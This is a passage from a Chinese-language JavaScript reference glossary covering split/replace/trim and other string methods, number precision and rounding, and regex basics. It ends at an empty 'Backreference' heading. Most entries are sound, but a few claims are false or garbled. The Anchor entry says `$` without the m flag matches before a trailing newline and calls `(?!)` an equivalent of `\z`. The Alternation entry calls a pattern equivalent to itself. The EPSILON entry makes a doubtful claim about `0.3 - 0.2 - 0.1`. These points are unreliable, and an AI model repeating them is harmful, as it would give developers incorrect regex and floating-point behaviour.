`str.split(separator, limit?)` 按分隔符把字符串切成**数组**，是 `join` 的逆操作。`separator` 可以是字符串、**正则**或 `undefined`：省略分隔符时返回 `[原字符串]`（只有一个元素的数组），传空串 `''` 则按**码元**逐字拆开（注意 `'😀'.split('')` 得到两个孤立代理项——要按码点拆必须用 `[...str]` 或 `Array.from(str)`）。`limit` 限制返回数组的最大长度（**超出部分被丢弃**，不是截断最后一个）。关键细节：分隔符在开头/结尾或连续出现时会产生**空字符串元素**（`'a,,b'.split(',')` 得到 `['a','','b']`，`'a,'.split(',')` 得到 `['a','']`）——做 CSV 解析时这是高频坑。正则分隔符配合捕获组时，**捕获到的分组也会进入结果数组**。

也见 [join（连接成字符串）](#join连接成字符串)、[String length（字符串长度陷阱）](#string-length字符串长度陷阱)。

示例：[`11_strings/06_split_and_join.js`](11_strings/06_split_and_join.js)

### replace, replaceAll（替换）

`str.replace(pattern, replacement)` 替换**第一处**匹配，`str.replaceAll(...)` 替换**所有**匹配，两者都返回新字符串。`pattern` 可以是字符串或正则：**字符串形式只匹配第一处且不做任何模式解释**（`replace('.', '-')` 只换第一个句点，不是「任意字符」）；想全部替换，用 `replaceAll` 或带 `g` 标志的正则。`replacement` 可以是字符串（支持 `$&`、`$1`、`$<name>`、`$`` 等特殊替换模式，注意 `$` 有特殊含义，替换字面美元符号要写 `$$`）或**函数**（`(match, p1, ..., offset, string) => ...`，用来做条件替换、大小写转换、查表）。关键细节：`replaceAll` 传字符串时是**字面量**匹配，传正则时**必须有 `g` 标志**，否则抛 `TypeError`；字符串形式下 `$` 模式依然生效，处理用户输入时要小心。

也见 [Tagged Template（标签模板）](#tagged-template标签模板)、[split（分割）](#split分割)。

示例：[`11_strings/07_replace_methods.js`](11_strings/07_replace_methods.js)

### padStart, padEnd（填充）

`str.padStart(targetLength, padString = ' ')` 在**开头**补字符到指定长度，`padEnd` 在**结尾**补；若原串已达到或超过目标长度则**原样返回**（不截断）。它们是「对齐输出、编号补零、固定宽度报表」的标准工具：`String(n).padStart(4, '0')` 得到 `'0007'`。关键细节：`targetLength` 和 `padString` 的长度单位都是**码元**；填充串会被**重复**以填满差额，如果填不满一个完整周期就**截断填充串**（`'5'.padStart(4, 'ab')` 得到 `'aba5'`）；`padString` 传空串或省略时是空格；负数、`NaN`、`Infinity` 等非法的目标长度会被当作 0（相当于不补）。**常见误解**：以为它能格式化数字的小数位——那是 `toFixed` 的职责，`padStart` 只管总宽度。

也见 [trim（去空白）](#trim去空白)、[toFixed（定点格式化）](#tofixed定点格式化)。

示例：[`11_strings/05_transform_methods.js`](11_strings/05_transform_methods.js)

### trim（去空白）

`str.trim()` 删除字符串**两端**的空白（含空格、制表符、换行、以及 Unicode 定义的各种空白如全角空格、不换行空格），`trimStart()`/`trimEnd()` 只处理单侧。它对**表单输入清洗**是必需步骤：用户在输入框里粘贴时很容易带上首尾空格，导致登录、比对、查表全部失败。关键细节：它只去**两端**、中间的空格保持原样（要去掉所有空格得用 `replace(/\s+/g, '')`）；返回**新字符串**，原串不变（忘了接收返回值就等于没写）；`trim` 在比较前使用要注意「是否应该视为相等」是业务决定——邮箱、用户名通常要 `trim` + `toLowerCase`，而密码**绝不能** `trim`（用户可能真的用了空格）。对应的 `padStart`/`padEnd` 是「加空白」，三者方向相反。

也见 [padStart, padEnd（填充）](#padstart-padend填充)、[localeCompare（本地化比较）](#localecompare本地化比较)。

示例：[`11_strings/05_transform_methods.js`](11_strings/05_transform_methods.js)

### localeCompare（本地化比较）

`a.localeCompare(b, locales?, options?)` 按**人类语言的排序规则**比较两个字符串，返回负数/0/正数（与比较函数约定一致），因此可以直接塞给 `sort`。它解决的是「`<` 和 `>` 按 UTF-16 码元比较」的荒谬结果：码元顺序下所有大写字母都排在小写字母前面、`'ä'` 排在 `'z'` 之后，而中文按码元比较完全不是拼音顺序。常用选项：`sensitivity: 'base'` 忽略大小写与重音（`'a'` 与 `'A'` 视为相等）、`numeric: true` 让 `'file10'` 排在 `'file9'` 之后（自然排序）、`caseFirst` 控制大小写优先。关键细节：性能比 `<` 差很多（每次调用都要走 ICU），对**大数组排序**可先 `Intl.Collator` 建一个比较器复用（见 `33_intl/`）；不传 locales 时结果依赖运行环境的默认区域，**跨环境可能不一致**。

也见 [Comparator（比较函数）](#comparator比较函数)、[String Comparison（字符串比较）](#string-comparison字符串比较)。

示例：[`11_strings/11_string_comparison.js`](11_strings/11_string_comparison.js)

### String Comparison（字符串比较）

字符串比较有两条完全不同的路径：`===` / `<` / `>` 走**码元数值顺序**，`localeCompare` 走**人类语言规则**。前者的问题很具体：`'Z' < 'a'` 为 `true`（'Z' 是 0x5A，'a' 是 0x61）、`'10' < '9'` 为 `true`（逐字符比较，'1' < '9'）、中文按码元很难得到有意义的结果。因此：**判断两个字符串是否相等用 `===`**（它精确、快、不涉及区域设置），**展示给人看的排序用 `localeCompare`**。另外要注意 `==` 会做类型转换（`'1' == 1` 为真），比较字符串一律用 `===`；`includes`/`startsWith`/`endsWith` 做的是子串判断而不是排序比较，且严格区分大小写（不区分大小写要先统一大小写或借助 `localeCompare` 的 `sensitivity`）。数字形式的内容要比较大小，先 `Number()` 再比较。

也见 [localeCompare（本地化比较）](#localecompare本地化比较)、[String（字符串）](#string字符串)。

示例：[`11_strings/11_string_comparison.js`](11_strings/11_string_comparison.js)

### slice, substring, substr（子串截取）

三个截取子串的方法，参数含义与边界处理完全不同：`slice(start, end)` 的第二个参数是**结束下标（不含）**，负数表示**从末尾倒数**；`substring(start, end)` 的第二个参数也是结束下标，但**负数/NaN 一律当 0**，并且 `start > end` 时**自动交换两个参数**（所以 `substring(3, 1)` 等于 `substring(1, 3)`，不返回空串）；`substr(start, length)` 的第二个参数是**长度**，只有 `start` 可为负，**已废弃（Annex B）不应在新代码里使用**。可记的结论是：**统一用 `slice`**，因为它的负参数行为最直观，而且数组上也有同名同义的方法，心智负担最小。三者都返回**新字符串**且按**码元**操作，可能切开代理对；参数省略时 `slice`/`substring` 截到末尾。

也见 [slice（切片）](#slice切片)、[Code Unit（码元）](#code-unit码元)。

示例：[`11_strings/08_substring_methods.js`](11_strings/08_substring_methods.js)

## 数值（Number & Math）

### Number（数值类型）

JS 只有**一种**数字类型 `Number`，内部一律是 **IEEE 754 双精度 64 位浮点数**（1 位符号 + 11 位指数 + 52 位尾数）。它同时承担「整数」和「小数」两种角色，带来两个无法回避的后果：很多十进制小数**无法精确表示**（`0.1 + 0.2 !== 0.3`）；整数超过 2⁵³-1 后**静默丢精度**（雪花 id 被 `JSON.parse` 时后几位变 0）。特殊值有 `NaN`（唯一不等于自身的值，判断必须用 `Number.isNaN`）、`Infinity`/`-Infinity`、`-0`（与 `0` 在 `===` 下相等，`Object.is` 能区分）。`BigInt` 提供任意精度整数（见 `03_data_types/05_bigint.js`），但**不能与 `Number` 混合运算**。需要精确十进制时应该用「整数分」或 decimal 库。

也见 [Number.MAX_SAFE_INTEGER（最大安全整数）](#numbermax_safe_integer最大安全整数)、[Floating Point Precision（浮点精度）](#floating-point-precision浮点精度)、[parseInt, parseFloat（解析数字）](#parseint-parsefloat解析数字)。

示例：[`12_numbers_and_math/05_number_methods.js`](12_numbers_and_math/05_number_methods.js)

### Math Object（Math 对象）

`Math` 是**内置的静态命名空间对象**，不能被 `new`，也不该被当作构造函数（它没有 `[[Construct]]`）。常用部分：常量 `Math.PI`、`Math.E`、`Math.LN2`；取整 `floor`/`ceil`/`round`/`trunc`；幂与根 `pow`、`sqrt`、`cbrt`、`hypot`；三角与对数 `sin`/`cos`/`log`/`log2`/`log10`；最值与符号 `min`/`max`/`abs`/`sign`；以及 `Math.random`。几个实用细节：`Math.max(...arr)` 是数组求最大值的惯用法，但**元素太多会爆栈**（用 `reduce` 更稳）；`Math.min()`/`Math.max()` 不传参数分别返回 `Infinity`/`-Infinity`；`Math.round` 对负数的「四舍五入」是**朝 +∞ 方向**的（`Math.round(-0.5)` 是 `-0`，不是 `-1`）；ES6 的 `Math.sign`/`trunc`/`cbrt`/`hypot` 在老环境需转译。

也见 [Rounding（取整）](#rounding取整)、[Math.random（随机数）](#mathrandom随机数)。

示例：[`12_numbers_and_math/01_math_object.js`](12_numbers_and_math/01_math_object.js)

### Rounding（取整）

四种取整方式的方向各不相同，选择错了就是业务事故：`Math.floor(x)` 向 **-∞** 取整（向下），`Math.ceil(x)` 向 **+∞** 取整（向上），`Math.trunc(x)` **去掉小数部分**（向 0 取整），`Math.round(x)` 取**最接近的整数**（`.5` 向 +∞ 舍入）。负数是最容易搞混的：`Math.floor(-2.5)` 是 `-3` 而 `Math.trunc(-2.5)` 是 `-2`；`Math.round(-2.5)` 是 `-2`。分页计算「共 10 条每页 3 条需几页」用 `Math.ceil(total / size)`；「第几页」用 `Math.floor(i / size)`（等价于 `Math.trunc` 在正数下的结果）。**需保留 N 位小数**时不能用 `Math.round(x * 100) / 100` 直接了事——`x * 100` 本身就会引入浮点误差，见 `toFixed` 与精度处理。另外要区分 `toFixed`（返回字符串）与 `toPrecision`（按有效数字）。

也见 [toFixed（定点格式化）](#tofixed定点格式化)、[Floating Point Precision（浮点精度）](#floating-point-precision浮点精度)、[Intl.NumberFormat（本地化数字格式化）](#intlnumberformat本地化数字格式化)。

示例：[`12_numbers_and_math/02_rounding.js`](12_numbers_and_math/02_rounding.js)

### toFixed（定点格式化）

`num.toFixed(digits)` 把数字格式化成**保留 N 位小数**的**字符串**（注意返回类型是 `string` 而不是 `number`，这才是它最常被误用的地方）。它按「四舍五入」的名义工作，实际行为以数字的**二进制真值**为准，所以 `(1.005).toFixed(2)` 得到 `'1.00'` 而不是 `'1.01'`——因为 `1.005` 在二进制里其实略小于 1.005。可靠的做法是先转成整数运算，或用 `Intl.NumberFormat` 的 `roundingMode`（`'halfExpand'`/`'halfEven'` 等，见 `12_numbers_and_math/09_locale_format_and_rounding.js`）。其他细节：`digits` 超出 0~100 会抛 `RangeError`；省略参数等价于 `toFixed(0)`；结果是**字符串**，要继续计算必须 `Number(...)` 转回来，而 `'1.00'` 转回数字会丢掉尾随零。展示金额时它可用，**计算金额时绝不能依赖它**。

也见 [Rounding（取整）](#rounding取整)、[Floating Point Precision（浮点精度）](#floating-point-precision浮点精度)、[Intl.NumberFormat（本地化数字格式化）](#intlnumberformat本地化数字格式化)。

示例：[`12_numbers_and_math/02_rounding.js`](12_numbers_and_math/02_rounding.js)

### Math.random（随机数）

`Math.random()` 返回 `[0, 1)` 区间内的**伪随机**浮点数（含 0、不含 1），无参数、**无法指定种子**，因此结果不可复现、也不能用于安全场景（密码、令牌、抽奖密钥必须用 `crypto.getRandomValues`）。几个必须记牢的公式：任意范围浮点 `min + Math.random() * (max - min)`；任意范围**整数（含两端）** `Math.floor(Math.random() * (max - min + 1)) + min`；随机取数组元素 `arr[Math.floor(Math.random() * arr.length)]`。关键细节：取整数**必须用 `Math.floor` 而不是 `Math.round`**，否则两端的概率会变成中间值的一半（经典偏差 bug）；区间的**左闭右开**性质意味着公式里的 `+1` 决定能否取到 `max`。需要可复现的随机（测试、游戏回放）要自己实现带种子的 PRNG。

也见 [Shuffle（洗牌算法）](#shuffle洗牌算法)、[Rounding（取整）](#rounding取整)。

示例：[`12_numbers_and_math/03_random.js`](12_numbers_and_math/03_random.js)

### Shuffle（洗牌算法）

把数组随机打乱的标准做法是 **Fisher-Yates（Knuth）洗牌**：从后往前遍历，对每个位置 `i` 取一个 `[0, i]` 范围内的随机下标 `j`，交换 `arr[i]` 与 `arr[j]`。它的关键在于「每个位置只与**已处理范围内**的位置交换」，这样能得到**均匀分布**的全部排列。常见的错误写法是 `arr.sort(() => Math.random() - 0.5)`：它看起来简洁，但依赖 `sort` 的比较函数自洽性，而随机比较函数**不自洽**，实际分布并不均匀（不同引擎结果差异明显），而且取决于排序算法内部实现。另一类常见错误是「随机取一个元素 push 到新数组并从原数组删除」，复杂度 O(n²) 且容易写错。实现细节：随机下标要用 `Math.floor(Math.random() * (i + 1))`，**上界是 `i+1`** 而不是 `arr.length`，用错就破坏均匀性。

也见 [Math.random（随机数）](#mathrandom随机数)、[Comparator（比较函数）](#comparator比较函数)。

示例：[`12_numbers_and_math/03_random.js`](12_numbers_and_math/03_random.js)

### parseInt, parseFloat（解析数字）

两条「从字符串里解析数字」的路径，与 `Number()` 的严格转换形成三种不同行为。`parseInt(str, radix)` **从左往右解析到第一个非法字符为止**：`parseInt('12px')` 得到 `12`、`parseInt('abc')` 得到 `NaN`；`radix` 是**进制**（2~36），**必须显式传 10**——不传时历史规则会根据前缀猜（`'0x10'` 按 16 进制得到 16），这是老代码里最难查的 bug 之一。`parseFloat(str)` 同理但支持小数，**没有进制参数**，遇到第二个小数点或 `e` 之外的字符就停。对比 `Number('12px')` 得到 `NaN`（整个字符串必须合法）、`Number('')` 得到 `0`（而 `parseInt('')` 是 `NaN`）。最常见的误用是把它们直接当回调传：`['1','2','3'].map(parseInt)`。

也见 [Callback Signature Pitfall（回调签名陷阱）](#callback-signature-pitfall回调签名陷阱)、[Number（数值类型）](#number数值类型)、[toFixed（定点格式化）](#tofixed定点格式化)。

示例：[`12_numbers_and_math/04_parseint_parsefloat.js`](12_numbers_and_math/04_parseint_parsefloat.js)

### Intl.NumberFormat（本地化数字格式化）

`Intl.NumberFormat` 是按**区域与语言**格式化数字的标准工具，能一行搞定千分位、货币符号、百分比、单位、小数位与舍入模式，比手写 `toFixed` + 正则拼接可靠得多。基本用法：`new Intl.NumberFormat('zh-CN', { style: 'currency', currency: 'CNY' }).format(1234.5)`；`style` 可取 `'decimal'`/`'currency'`/`'percent'`/`'unit'`；`useGrouping` 控制千分位；`minimumFractionDigits`/`maximumFractionDigits` 控制小数位。三个关键细节：ES2023 起支持 **`roundingMode`**（`'halfExpand'` 四舍五入、`'halfEven'` 银行家舍入等），这是语言内置的、不受二进制浮点误差影响的正规舍入方案；构造 `Intl.NumberFormat` 实例**开销较大**，循环格式化时应**复用同一个实例**而不是每次 `new`；`format` 的结果是**字符串**，且受运行环境的 ICU 数据影响，跨环境可能略有差异。完整用法见 `33_intl/`。

也见 [toFixed（定点格式化）](#tofixed定点格式化)、[Rounding（取整）](#rounding取整)、[localeCompare（本地化比较）](#localecompare本地化比较)。

示例：[`12_numbers_and_math/07_intl_number_format.js`](12_numbers_and_math/07_intl_number_format.js)、[`12_numbers_and_math/09_locale_format_and_rounding.js`](12_numbers_and_math/09_locale_format_and_rounding.js)

### Floating Point Precision（浮点精度）

浮点精度问题不是 JS 的 bug，而是 **IEEE 754 双精度二进制浮点**的固有性质：像 `0.1`、`0.2`、`0.3` 这样的十进制小数在二进制里是**无限循环小数**，只能被近似存储，所以 `0.1 + 0.2 === 0.30000000000000004`。工程上有四种解法：**放大取整**（`Math.round(x * 10**n) / 10**n`，注意乘法本身也可能引入误差，可用 `Number(`${x}e${n}`)` 规避）；**整数分表示**（金额一律以「分」为单位存整数，只在展示时除 100，这是电商系统的通行做法）；**十进制字符串运算**（引入 decimal 库，任意精度但慢）；**容差比较**（不算精确相等，用 `Math.abs(a - b) < 容差`）。关键判断标准：涉及**金额、库存、税额**时不要用「看起来能跑」的浮点方案，必须在数据进入计算前就定好单位与精度策略。

也见 [Number.EPSILON（机器精度）](#numberepsilon机器精度)、[Number.MAX_SAFE_INTEGER（最大安全整数）](#numbermax_safe_integer最大安全整数)、[toFixed（定点格式化）](#tofixed定点格式化)。

示例：[`12_numbers_and_math/08_precision_handling.js`](12_numbers_and_math/08_precision_handling.js)、[`12_numbers_and_math/06_number_limits.js`](12_numbers_and_math/06_number_limits.js)

### Number.EPSILON（机器精度）

`Number.EPSILON` 等于 2⁻⁵² ≈ 2.220446049250313e-16，是「1 与**大于 1 的最小可表示数**之间的差」，也就是双精度浮点在 1 附近的**间距（机器精度）**。它的标准用途是**浮点容差比较**：`Math.abs(a - b) < Number.EPSILON` 用来判断「两个数是否足够接近」。关键细节：EPSILON 是**针对 1 附近的绝对间距**，对数量级大的数（如 `1e16`）它太小、对很小的数它又太大，所以更稳妥的写法是按量级缩放：`Math.abs(a - b) <= Number.EPSILON * Math.max(Math.abs(a), Math.abs(b))`，或直接使用业务容差（金额场景用 0.005 这样的「半分钱」）。它**不是**「万能精度保证」，也不能用来做「精确相等」——`0.1 + 0.2 - 0.3` 的结果约 5.5e-17，虽小于 EPSILON，但量级稍大的场景（如 `0.3 - 0.2 - 0.1`）就会超。

也见 [Floating Point Precision（浮点精度）](#floating-point-precision浮点精度)、[Number（数值类型）](#number数值类型)。

示例：[`12_numbers_and_math/06_number_limits.js`](12_numbers_and_math/06_number_limits.js)

### Number.MAX_SAFE_INTEGER（最大安全整数）

`Number.MAX_SAFE_INTEGER` 是 2⁵³-1 = **9007199254740991**，含义是「**能保证唯一且精确表示的整数上限**」：超过它之后 `n` 与 `n + 1` 可能算成同一个值，整数运算会**静默丢精度**（不抛错、不警告）。判断某个值能否安全当整数用，要用 `Number.isSafeInteger(x)`（它同时判断「是整数」和「在安全范围内」，两个条件都满足才为 `true`）。最现实的后果是：**后端用雪花算法生成的 19 位 id 直接 `JSON.parse` 会丢掉后几位**，所以业界约定大整数 id 必须以**字符串**形式传输，前端全程当字符串处理（或改用 `BigInt`）。相关边界还有 `Number.MAX_VALUE`（约 1.8e308，超过就是 `Infinity`）和 `Number.MIN_VALUE`（5e-324，更小的正数下溢成 0）。

也见 [Number（数值类型）](#number数值类型)、[Floating Point Precision（浮点精度）](#floating-point-precision浮点精度)。

示例：[`12_numbers_and_math/06_number_limits.js`](12_numbers_and_math/06_number_limits.js)

---

## 正则表达式（Regular Expressions）

### Regular expression（正则表达式）

一种用紧凑的元字符语法描述「字符串模式」的小型语言，JavaScript 通过内建的 `RegExp` 类型实现它。它的价值在于把「匹配 / 查找 / 提取 / 替换」这类文本处理从手写循环 + 下标运算，压缩成一句声明式的模式。关键细节：正则**不是**一个独立的解析引擎，而是被宿主语言包了一层接口——既可以直接写 `/abc/`，也可以 `new RegExp("abc")`。常见误解是把它当成万能解析器：正则只适合**正则语言**（无嵌套配对结构），解析 HTML、嵌套括号、JSON 这类需要「计数」的场景应当用真正的解析器。

示例：[`13_regexp/01_basics_and_literals.js`](13_regexp/01_basics_and_literals.js)

### Regex literal（正则字面量）

用一对斜杠 `/pattern/flags` 直接书写的正则，例如 `/\d+/g`。与 `new RegExp("\\d+", "g")` 相比，字面量在**词法分析阶段**就被编译：同一段字面量在循环里复用同一个 `RegExp` 对象（共享 `lastIndex`），且不需要对反斜杠做二次转义。这是它最重要的实践差异——动态构造的模式（拼用户输入、拼变量）只能用构造器，此时要小心**转义地狱**：字符串里 `\d` 会被吃成 `d`，必须写 `"\\d"`。也见 RegExp constructor（RegExp 构造器）。

示例：[`13_regexp/01_basics_and_literals.js`](13_regexp/01_basics_and_literals.js)

### RegExp constructor（RegExp 构造器）

`new RegExp(pattern, flags)` 用运行时字符串动态生成正则，是唯一能拼接变量的方式。它和字面量的差别不只是写法：每次调用都产生**全新的对象与全新的 `lastIndex`**（字面量在同一处代码重复执行时是同一个对象），这对带 `g` 标志的复用循环影响很大。关键细节：传入的字符串要写成转义后的形式，`new RegExp("\\w+")` 才等价于 `/\w+/`；ES6 起 `new RegExp(regexpObj, flags)` 可以基于已有正则换标志（此时 `source` 与 `flags` 会被复制，但 `lastIndex` 重置为 0）。也见 Regex literal（正则字面量）、Flags 修饰符。

示例：[`13_regexp/01_basics_and_literals.js`](13_regexp/01_basics_and_literals.js)

### test（test 方法）

`regex.test(str)` 返回布尔值，只回答「能不能匹配上」，是校验、条件判断最常用的入口。它的独特性在于**会推进 `lastIndex`**：对于带 `g` 或 `y` 标志的正则，每次成功匹配后 `lastIndex` 停在下一次搜索的起点。这意味着同一个正则对象连续 `test` 同一字符串会得到交替的 `true / false`——这是初学者最常踩的坑，因为「正则的行为取决于它上次用在哪」。解决办法：校验场景去掉 `g`，或者在复用前手动 `re.lastIndex = 0`。也见 `lastIndex` statefulness（`lastIndex` 状态性）。

示例：[`13_regexp/01_basics_and_literals.js`](13_regexp/01_basics_and_literals.js)

### exec（exec 方法）

`regex.exec(str)` 是功能最完整的匹配原语：命中时返回一个**类数组**（真实数组，带 `index`、`input`、`groups` 三个附加属性），元素 0 是整体匹配，1..n 是各捕获组；未命中返回 `null`。配合 `g` 标志时，它可以在 `while ((m = re.exec(s)) !== null)` 循环里逐次推进，把 `lastIndex` 当成游标遍历全部匹配——这正是 `matchAll` 出现之前的标准写法。注意：`exec` 从不返回空数组，判定必须写 `if (m)` 而不是 `if (m.length)`；忘记循环里的 `lastIndex` 归零还会导致死循环。

示例：[`13_regexp/05_groups_and_alternation.js`](13_regexp/05_groups_and_alternation.js)

### `lastIndex` statefulness（`lastIndex` 状态性）

`lastIndex` 是 `RegExp` 实例上的可读写数字属性，只在 `g`（全局）或 `y`（粘性）标志下被 `exec` / `test` 读写，表示「下一次从哪个下标开始找」。它的存在使正则对象成为**有状态的迭代器**：同一个对象用于不同字符串时，"下一个"位置会残留，导致漏匹配或交替匹配。这是 JS 正则最经典的陷阱，也解释了为什么 `String.prototype.match` 在带 `g` 时会一次性返回所有结果并**忽略/重置** `lastIndex`，而 `exec` 不会。实践建议：需要状态就别共享正则对象，不需要状态就在函数内部现造字面量。

示例：[`13_regexp/09_flags.js`](13_regexp/09_flags.js)

### Character class（字符类）

用 `[...]` 表示「此处可以是集合里的任意一个字符」，例如 `[aeiou]`、`[0-9a-fA-F]`。类内的元字符失去特殊含义——`[.]` 匹配的只是字面点号——只有 `\`、`]`、`^`（首位）和 `-`（中间）需要转义。关键细节：字符类匹配的永远是**单个字符**，`[abc]{2}` 才是两个字符；`[a-z]` 是范围而不是「a 或 - 或 z」。常见误解是把 `[12]` 写成 `[1,2]`（多出的逗号会让模式也接受 `,`）。

示例：[`13_regexp/02_character_classes.js`](13_regexp/02_character_classes.js)

### Shorthand character class（简写字符类）

`\d \w \s` 及其大写取反形式 `\D \W \S` 是常用字符类的缩写：`\d` = `[0-9]`，`\w` = `[A-Za-z0-9_]`，`\s` = 空白（空格、制表、换行、全角空格等 Unicode 空白）。它们让模式短而可读，但要注意三个陷阱：`\w` 的「单词」只含 ASCII 字母数字下划线，中文不会被算进去（需 `u` 标志配合 Unicode 属性转义 `\p{Letter}`）；`\s` 包含换行，用 `\s` 代替空格往往会跨行误匹配；`\D` 这类取反类**会匹配换行**，因为取反是相对于整个字符集而非行。也见 Negated character class（取反字符类）。

示例：[`13_regexp/02_character_classes.js`](13_regexp/02_character_classes.js)

### Negated character class（取反字符类）

`[^...]` 表示「不是这个集合里的任意字符」，`[^0-9]` 即「任意非数字字符」。它的实用价值在于配合量词的「吃到边界为止」语义：`[^"]*` 能一口气吃掉引号之间的所有内容，是解析 CSV、提取带引号片段时最常用的构造。关键细节：取反类**必匹配一个字符**，量词 `*` 只是让它可为零次，所以 `[^"]*` 永远不可能是「空匹配位置」以外的零宽；`^` 只有紧跟在 `[` 之后才是取反，写成 `[a^]` 就只是普通字符。注意 `[^]` 是一个合法且匹配任意字符（含换行）的模式，等价于 `[\s\S]`。

示例：[`13_regexp/02_character_classes.js`](13_regexp/02_character_classes.js)

### Quantifier（量词）

`*`（0 次以上）、`+`（1 次以上）、`?`（0 或 1 次）、`{n}`、`{n,}`、`{n,m}` 用来描述「重复多少次」，它们作用于**前面紧邻的一个单元**（单字符、转义序列或分组）。关键细节：量词绑定的是紧邻项，`ab+` 是 `a` 后跟一个以上 `b`，要表达「ab 重复」必须写 `(?:ab)+`；`?` 另有「可选」和「惰性修饰符」两种含义，取决于它是跟在量词之后还是单独出现。常见误解是把 `{2,}` 与 `{2, }`（带空格）写成同一个东西——量词里不允许空格。

示例：[`13_regexp/03_quantifiers.js`](13_regexp/03_quantifiers.js)

### Greedy vs lazy（贪婪与惰性）

默认量词是**贪婪**的：先尽可能多地吃字符，只有当后续模式匹配失败时才「吐回」一部分。在量词后加 `?` 变成**惰性**（`*?`、`+?`、`{n,m}?`），它先尽量少吃，只在需要时才扩张。这是理解匹配结果差异的关键：对 `"<a><b>"` 用 `/.*/` 得到整串，用 `/.*?/` 得到空串，用 `/<.*?>/` 得到 `<a>`。实践上惰性常用于「匹配到最近的分隔符」，但它不等于更快——惰性只是改变了尝试顺序，回溯依然可能发生，只是通常更少。

示例：[`13_regexp/03_quantifiers.js`](13_regexp/03_quantifiers.js)

### Backtracking（回溯）

正则引擎在尝试失败时「退回去换个选择」的机制，是正则能正确工作的核心，也是性能问题的根源。以 `/[ab]+c/` 匹配 `"abab"` 为例，引擎会先吃掉全部字符再发现缺 `c`，然后逐步回退重试——每退一步可能触发指数级的分支组合。关键认识：回溯是**深度优先**的，模式写法的微小差别（`[^"]*` 对比 `.*?`）会显著改变尝试次数；DFA 引擎（如 RE2）没有回溯所以不会爆炸，但 JS 的 `RegExp` 是回溯型引擎，因此必须自己写安全的模式。也见 Catastrophic backtracking（灾难性回溯）。

示例：[`13_regexp/13_catastrophic_backtracking.js`](13_regexp/13_catastrophic_backtracking.js)

### Catastrophic backtracking（灾难性回溯 / ReDoS）

当模式里存在**可重叠的重复**（尤其是嵌套量词，如 `/(a+)+b/`），失败的输入会让回溯次数呈指数增长，输入长度每加一个字符耗时翻倍——这就是 ReDoS（Regular Expression Denial of Service）。典型触发条件是「两个量词可以匹配同一段字符」加「匹配必定失败」，例如校验邮箱的 `/^(\w+\s?)*$/` 遇到长串非空格字符。防御原则：改写模式消除歧义（把 `(a+)+` 换成 `a+`）、用更精确的字符类代替 `.`、限制输入长度、给匹配设超时，或改用无回溯引擎。它不只是性能问题，在服务端处理用户输入时是真实的安全漏洞。

示例：[`13_regexp/13_catastrophic_backtracking.js`](13_regexp/13_catastrophic_backtracking.js)

### Anchor（锚点）

`^` 与 `$` 分别断言「位置在输入开头 / 结尾」，本身**不消耗字符**。它们的实际含义受多行标志影响：不加 `m` 时 `^` 只匹配整串的起点，加了 `m` 则同时匹配每个 `\n` 之后的位置。关键细节：`$` 默认匹配「字符串末尾」，但老规范中它还允许匹配「末尾换行之前」——所以 `/^\d+$/` 在部分场景会接受 `"123\n"`，严格校验应使用 `\z` 等价写法 `(?!)` 或配上 `\n` 排除。常见误解是以为 `^` `$` 就是「行的开始结束」，记得多行模式下才是。

示例：[`13_regexp/04_anchors_and_boundaries.js`](13_regexp/04_anchors_and_boundaries.js)

### Word boundary（单词边界）

`\b` 断言「当前位置的左边是 `\w` 而右边不是，或反之」，`\B` 则断言不是边界，两者都是零宽断言。它解决的是「按整词匹配」的需求：`/\bcat\b/` 能匹配 `"a cat."` 而不会命中 `"category"`，这比 `/[^a-z]cat[^a-z]/` 干净得多。关键细节：`\b` 的定义完全依赖 `\w` 的 ASCII 假设，因此中文/带重音的字母旁边**不存在**词边界，`\b` 在那里会失效——处理 Unicode 文本需要 Unicode 属性转义。也见 Zero-width assertion（零宽断言）。

示例：[`13_regexp/04_anchors_and_boundaries.js`](13_regexp/04_anchors_and_boundaries.js)

### Multiline mode（多行模式）

`m` 标志改变 `^` 和 `$` 的语义，让它们匹配每一行的开头和结尾（以 `\n` 为界）而非整串边界。没有 `m` 时 `/^b/` 只能匹配首字符是 `b` 的字符串；加上 `m` 后 `/^b/m` 能匹配多行文本中任何一行以 `b` 开头的位置。关键细节：`m` **不影响 `.` 是否匹配换行**——那是 `s` 标志的职责，两者常被混淆。另一个陷阱是 `\r\n` 换行：`$` 只会停在 `\n` 前，导致捕获结果带一个 `\r`，跨平台读取文本时要显式处理。

示例：[`13_regexp/09_flags.js`](13_regexp/09_flags.js)

### Capturing group（捕获组）

用 `(...)` 包裹的子模式，它同时做两件事：把子模式**作为一个单元**接受量词/选择，以及**把命中的内容记住**以便取用。结果数组里下标 1 开始就是各组内容，`exec` 返回值的 `index` 则指向整体匹配位置。关键细节：组可以嵌套，编号按**左括号出现顺序**而非嵌套层次；不匹配的可选组在结果里是 `undefined` 而不是空串，这是区分「没参与匹配」与「匹配到空」的唯一方式。也见 Non-capturing group（非捕获组）。

示例：[`13_regexp/05_groups_and_alternation.js`](13_regexp/05_groups_and_alternation.js)

### Non-capturing group（非捕获组）

`(?:...)` 提供分组的**结构性**能力但不占用编号、不产生捕获结果，是性能与可维护性上的默认选择。当你只想「让这段子模式整体接受量词或参与选择」时（`(?:ab)+`、`/(?:cat|dog)s/`），用捕获组会白白污染编号，让后面所有组的索引位移一位——这类偏移 bug 在插入新分组后极难定位。另外 `(?<name>...)` 是具名形式、`(?=...)` `(?<=...)` 是断言形式，它们也都不参与数字编号（具名组仍可从 `groups` 取）。实践建议：不需要取值就用 `(?:)`。

示例：[`13_regexp/05_groups_and_alternation.js`](13_regexp/05_groups_and_alternation.js)

### Alternation（选择分支）

`|` 表示「或」，例如 `/cat|dog/`，它的优先级**最低**——所以 `/(?:cat|dog)s/` 才能表达「cats 或 dogs」，写 `/cat|dogs/` 则等价于 `/cat|dogs/` 两个完整分支。关键细节：分支是从左到右**短路**尝试的，`/a|ab/` 匹配 `"ab"` 时只会得到 `"a"`，需要时把更长的分支写在前面。它在字符类内部无意义：`[a|b]` 匹配的是 `a`、`|`、`b` 三个字符之一，这是很常见的混淆点。也见 Non-capturing group（非捕获组）。

示例：[`13_regexp/05_groups_and_alternation.js`](13_regexp/05_groups_and_alternation.js)

### Backreference（反向引用）

